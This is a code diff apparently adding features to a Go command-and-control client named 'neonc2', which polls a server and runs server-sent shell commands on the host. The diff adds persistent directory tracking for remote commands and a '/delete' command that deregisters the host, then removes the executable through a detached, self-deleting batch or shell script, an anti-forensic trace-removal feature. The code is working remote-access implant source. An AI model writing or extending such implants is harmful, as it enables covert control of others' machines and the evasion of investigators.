@@ -10,6 +10,7 @@ import (
 	"net/http"
 	"os"
 	"os/exec"
+	"path/filepath"
 	"runtime"
 	"strconv"
 	"strings"
@@ -28,6 +29,7 @@ var (
 	arch           string
 	hardwareID     string
 	syncInterval   time.Duration = 5 * time.Second  // Default, can be updated from server
+	currentDir     string        // Current working directory (stateful)
 )
 
 // Build-time variables (set via ldflags)
@@ -186,6 +188,23 @@ func getSystemInfo() {
 	default:
 		osVersion = osType
 	}
+	
+	// Initialize current working directory
+	if dir, err := os.Getwd(); err == nil {
+		currentDir = dir
+	} else {
+		// Fallback to home directory or root
+		if home, err := os.UserHomeDir(); err == nil {
+			currentDir = home
+		} else {
+			if osType == "windows" {
+				currentDir = "C:\\"
+			} else {
+				currentDir = "/"
+			}
+		}
+	}
+	log.Printf("Initial working directory: %s", currentDir)
 }
 
 func registerHost() error {
@@ -268,6 +287,19 @@ func executeCommand(cmdStr string) (string, string, int) {
 	var cmd *exec.Cmd
 	var stdout, stderr bytes.Buffer
 	
+	// Use current working directory for command execution
+	// This ensures all commands (ls, cat, type, dir, etc.) execute in the stateful directory
+	workingDir := currentDir
+	
+	// Validate working directory exists (fallback to current if invalid)
+	if _, err := os.Stat(workingDir); err != nil {
+		log.Printf("Warning: Working directory %s is invalid, using current directory", workingDir)
+		if cwd, err := os.Getwd(); err == nil {
+			workingDir = cwd
+			currentDir = cwd // Update state
+		}
+	}
+	
 	switch osType {
 	case "windows":
 		// On Windows, use a more reliable method to capture output
@@ -278,19 +310,26 @@ func executeCommand(cmdStr string) (string, string, int) {
 			os.Remove(tmpFile)
 		}()
 		
-		// Create batch command that redirects both stdout and stderr to temp file
+		// Create batch command that changes to working directory, then executes command
+		// Escape the working directory path for use in batch file
+		escapedDir := strings.ReplaceAll(workingDir, "%", "%%")
+		escapedDir = strings.ReplaceAll(escapedDir, "&", "^&")
+		escapedDir = strings.ReplaceAll(escapedDir, "|", "^|")
+		
 		batchCmd := fmt.Sprintf(`@echo off
 chcp 65001 >nul 2>&1
+cd /d "%s"
 (%s) > "%s" 2>&1
-echo EXITCODE=%ERRORLEVEL% >> "%s"`, cmdStr, tmpFile, tmpFile)
+echo EXITCODE=%%ERRORLEVEL%% >> "%s"`, escapedDir, cmdStr, tmpFile, tmpFile)
 		
 		// Write batch to temp file
 		batchFile := tmpFile + ".bat"
 		if err := os.WriteFile(batchFile, []byte(batchCmd), 0644); err != nil {
 			log.Printf("Failed to create batch file: %v", err)
 			// Fallback to direct execution
-			wrappedCmd := fmt.Sprintf("chcp 65001 >nul 2>&1 && %s", cmdStr)
+			wrappedCmd := fmt.Sprintf("chcp 65001 >nul 2>&1 && cd /d \"%s\" && %s", escapedDir, cmdStr)
 			cmd = exec.Command("cmd", "/c", wrappedCmd)
+			cmd.Dir = workingDir // Set working directory (redundant but safe)
 			cmd.Stdout = &stdout
 			cmd.Stderr = &stdout
 			cmd.Run()
@@ -298,8 +337,9 @@ echo EXITCODE=%ERRORLEVEL% >> "%s"`, cmdStr, tmpFile, tmpFile)
 		}
 		defer os.Remove(batchFile)
 		
-		// Execute the batch file
+		// Execute the batch file with working directory set
 		cmd = exec.Command("cmd", "/c", batchFile)
+		cmd.Dir = workingDir // Set working directory for the command execution
 		err := cmd.Run()
 		exitCode := 0
 		if err != nil {
@@ -336,6 +376,7 @@ echo EXITCODE=%ERRORLEVEL% >> "%s"`, cmdStr, tmpFile, tmpFile)
 		return "", "", exitCode
 	default:
 		cmd = exec.Command("sh", "-c", cmdStr)
+		cmd.Dir = workingDir // Set working directory
 		cmd.Stdout = &stdout
 		cmd.Stderr = &stderr
 		
@@ -449,6 +490,139 @@ func processCommands(commands []Command) {
 			log.Printf("Exiting client...")
 			os.Exit(0)
 			return
+		}
+		
+		if cmdStr == "/delete" {
+			log.Printf("Received delete command. Deregistering, deleting executable, and exiting...")
+			
+			// Submit result first
+			result := CommandResult{
+				Status:   "completed",
+				Result:   "Client deregistering, deleting executable, and exiting",
+				ExitCode: intPtr(0),
+			}
+			submitResult(cmd.ID, result)
+			
+			// Give a moment for the result to be sent
+			time.Sleep(1 * time.Second)
+			
+			// Call server API to delete this host entry
+			req, err := http.NewRequest("DELETE", fmt.Sprintf("%s/api/hosts/%s/deregister", serverURL, hostID), nil)
+			if err == nil {
+				client := &http.Client{Timeout: 5 * time.Second}
+				resp, err := client.Do(req)
+				if err == nil {
+					resp.Body.Close()
+					log.Printf("Host entry deleted from server")
+				} else {
+					log.Printf("Warning: Failed to delete host entry: %v", err)
+				}
+			}
+			
+			// Get the executable path
+			execPath, err := os.Executable()
+			if err != nil {
+				log.Printf("Warning: Failed to get executable path: %v", err)
+				os.Exit(0)
+				return
+			}
+			
+			// Delete the executable (using platform-specific method)
+			if err := deleteExecutable(execPath); err != nil {
+				log.Printf("Warning: Failed to schedule executable deletion: %v", err)
+			} else {
+				log.Printf("Executable deletion scheduled: %s", execPath)
+			}
+			
+			// Exit the client
+			log.Printf("Exiting client...")
+			os.Exit(0)
+			return
+		}
+		
+		// Handle cd command (change directory)
+		if strings.HasPrefix(cmdStr, "cd ") || cmdStr == "cd" {
+			parts := strings.Fields(cmdStr)
+			var targetDir string
+			
+			if len(parts) == 1 {
+				// Just "cd" - go to home directory
+				if home, err := os.UserHomeDir(); err == nil {
+					targetDir = home
+				} else {
+					result := CommandResult{
+						Status:   "failed",
+						Error:    "Failed to get home directory",
+						ExitCode: intPtr(1),
+					}
+					submitResult(cmd.ID, result)
+					continue
+				}
+			} else {
+				targetDir = strings.TrimSpace(strings.TrimPrefix(cmdStr, "cd "))
+				// Handle "cd -" to go to previous directory (we'll track this later if needed)
+				// For now, just handle it as a regular path
+			}
+			
+			// Resolve the path relative to current directory
+			var absPath string
+			if filepath.IsAbs(targetDir) {
+				absPath = targetDir
+			} else {
+				absPath = filepath.Join(currentDir, targetDir)
+			}
+			
+			// Clean the path
+			absPath = filepath.Clean(absPath)
+			
+			// Check if directory exists
+			if info, err := os.Stat(absPath); err != nil {
+				result := CommandResult{
+					Status:   "failed",
+					Error:    fmt.Sprintf("cd: %s: %v", targetDir, err),
+					ExitCode: intPtr(1),
+				}
+				submitResult(cmd.ID, result)
+				continue
+			} else if !info.IsDir() {
+				result := CommandResult{
+					Status:   "failed",
+					Error:    fmt.Sprintf("cd: %s: Not a directory", targetDir),
+					ExitCode: intPtr(1),
+				}
+				submitResult(cmd.ID, result)
+				continue
+			}
+			
+			// Change directory
+			oldDir := currentDir
+			currentDir = absPath
+			
+			// Verify the change worked
+			if actualDir, err := os.Getwd(); err == nil {
+				// Try to change to verify it's accessible
+				if err := os.Chdir(currentDir); err != nil {
+					currentDir = oldDir // Revert on error
+					result := CommandResult{
+						Status:   "failed",
+						Error:    fmt.Sprintf("cd: %s: %v", targetDir, err),
+						ExitCode: intPtr(1),
+					}
+					submitResult(cmd.ID, result)
+					continue
+				}
+				// Restore original directory (we'll use currentDir in executeCommand)
+				os.Chdir(actualDir)
+			}
+			
+			result := CommandResult{
+				Status:   "completed",
+				Result:   fmt.Sprintf("Changed directory to: %s", currentDir),
+				ExitCode: intPtr(0),
+			}
+			submitResult(cmd.ID, result)
+			log.Printf("Changed directory from %s to %s", oldDir, currentDir)
+			continue
 		}
 		
 		// Handle configuration commands
@@ -591,4 +765,80 @@ func min(a, b int) int {
 		return a
 	}
 	return b
+}
+
+func deleteExecutable(execPath string) error {
+	// On Windows, we can't delete a running executable directly.
+	// We need to create a script that waits for the process to exit, then deletes the file.
+	// On Unix-like systems, we can use a similar approach.
+	
+	switch osType {
+	case "windows":
+		// Create a batch script that deletes the executable after a delay
+		// The script will run after this process exits
+		tmpDir := os.TempDir()
+		scriptPath := filepath.Join(tmpDir, fmt.Sprintf("neonc2_delete_%d.bat", time.Now().UnixNano()))
+		
+		// Create batch script that:
+		// 1. Waits a few seconds for the process to fully exit
+		// 2. Deletes the executable
+		// 3. Deletes itself
+		scriptContent := fmt.Sprintf(`@echo off
+timeout /t 2 /nobreak >nul 2>&1
+:retry
+del "%s" >nul 2>&1
+if exist "%s" (
+    timeout /t 1 /nobreak >nul 2>&1
+    goto retry
+)
+del "%%~f0" >nul 2>&1
+`, execPath, execPath)
+		
+		if err := os.WriteFile(scriptPath, []byte(scriptContent), 0644); err != nil {
+			return fmt.Errorf("failed to create delete script: %w", err)
+		}
+		
+		// Execute the script in the background (detached)
+		cmd := exec.Command("cmd", "/c", "start", "/B", scriptPath)
+		if err := cmd.Start(); err != nil {
+			os.Remove(scriptPath) // Clean up on error
+			return fmt.Errorf("failed to start delete script: %w", err)
+		}
+		cmd.Process.Release() // Detach from parent process
+		
+		return nil
+	default:
+		// On Unix-like systems, create a shell script that deletes the executable
+		tmpDir := os.TempDir()
+		scriptPath := filepath.Join(tmpDir, fmt.Sprintf("neonc2_delete_%d.sh", time.Now().UnixNano()))
+		
+		// Create shell script that:
+		// 1. Waits a few seconds for the process to fully exit
+		// 2. Deletes the executable
+		// 3. Deletes itself
+		scriptContent := fmt.Sprintf(`#!/bin/sh
+sleep 2
+rm -f "%s" 2>/dev/null
+# Retry if file still exists (process might still be running)
+while [ -f "%s" ]; do
+    sleep 1
+    rm -f "%s" 2>/dev/null
+done
+rm -f "$0" 2>/dev/null
+`, execPath, execPath, execPath)
+		
+		if err := os.WriteFile(scriptPath, []byte(scriptContent), 0755); err != nil {
+			return fmt.Errorf("failed to create delete script: %w", err)
+		}
+		
+		// Execute the script in the background (detached)
+		cmd := exec.Command("sh", "-c", fmt.Sprintf("nohup %s >/dev/null 2>&1 &", scriptPath))
+		if err := cmd.Start(); err != nil {
+			os.Remove(scriptPath) // Clean up on error
+			return fmt.Errorf("failed to start delete script: %w", err)
+		}
+		cmd.Process.Release() // Detach from parent process
+		
+		return nil
+	}
 }
